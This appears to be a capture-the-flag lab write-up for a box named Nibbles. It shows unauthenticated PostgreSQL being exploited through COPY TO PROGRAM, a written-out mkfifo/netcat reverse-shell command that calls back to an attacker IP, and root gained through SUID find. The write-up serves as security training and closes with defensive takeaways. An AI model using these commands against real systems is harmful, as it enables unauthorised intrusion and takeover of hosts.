#Linux #PostgreSQL #RCE #CVE #SUID #find #GTFOBins #CredentialReuse

## Overview

Nibbles exposes a PostgreSQL database on a non-standard port with no authentication required. An authenticated RCE exploit targeting PostgreSQL 11.3-11.9 delivers a shell as the `postgres` service user. A SUID bit on `/usr/bin/find` then closes the box in one command via GTFOBins.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
```

Port 80 had no interesting content (gobuster returned only 403s across the full wordlist). Port 5437 running PostgreSQL publicly is the primary finding, databases should not be internet-accessible.

### Web Enumeration

```sh
gobuster dir -u http://192.168.206.47/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
# No findings beyond 403 errors
```

The HTTP service offered nothing. The PostgreSQL instance on 5437 was the attack path.

## Foothold

### PostgreSQL RCE, CVE (9.3-11.7)

PostgreSQL 11.3-11.9 has a known authenticated RCE vulnerability (Exploit-DB 50847) that abuses the `COPY TO/FROM PROGRAM` feature to run arbitrary OS commands as the database user. The target was running PostgreSQL 11.7, confirmed in-range:

```sh
python3 psql.py -i 192.168.206.47 -p 5437 -c id
[+] Connection to Database established
[+] PostgreSQL 11.7 is likely vulnerable
[+] Command executed
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
```

> **Why `COPY TO PROGRAM` is RCE:** PostgreSQL's `COPY` command can pipe data to or from a shell command. A user with the right privileges (the default `postgres` superuser role) can run `COPY (SELECT '') TO PROGRAM 'cmd'`, and the database server executes `cmd` as the OS user running the PostgreSQL process. On this target, the database was listening publicly and accepted connections without a password, so no brute-forcing was needed.

Upgraded to a full reverse shell using mkfifo:

```sh
python3 psql.py -i 192.168.206.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.167 80 >/tmp/f'
```

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.47] 47492
$ whoami
postgres
```

TTY upgrade:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### SUID find

LinPEAS found a SUID bit on the system `find` binary:

```sh
-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
```

GTFOBins SUID method for `find`:

```sh
postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

> **Why SUID `find` escalates privileges:** `find` with the SUID bit runs as its owner (root) regardless of who invokes it. The `-exec` flag runs an arbitrary command in a child process that inherits the effective UID of `find`. Passing `/bin/sh -p` (preserve effective UID) spawns a shell running as root. The `-quit` stops `find` after the first execution so it doesn't loop through every file in the current directory.

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **Databases on non-standard ports with no authentication are direct footholds.** Port 5437 with no credentials meant the `COPY TO PROGRAM` exploit ran without any authentication phase.
- **`COPY TO PROGRAM` turns database access into OS code execution.** Any PostgreSQL superuser can use this; it's not a bug but an intentional feature that becomes a vulnerability when the database is externally accessible.
- **SUID on standard system binaries like `find` is an immediate privilege escalation.** Check `find / -perm -u=s 2>/dev/null` early in post-exploitation.
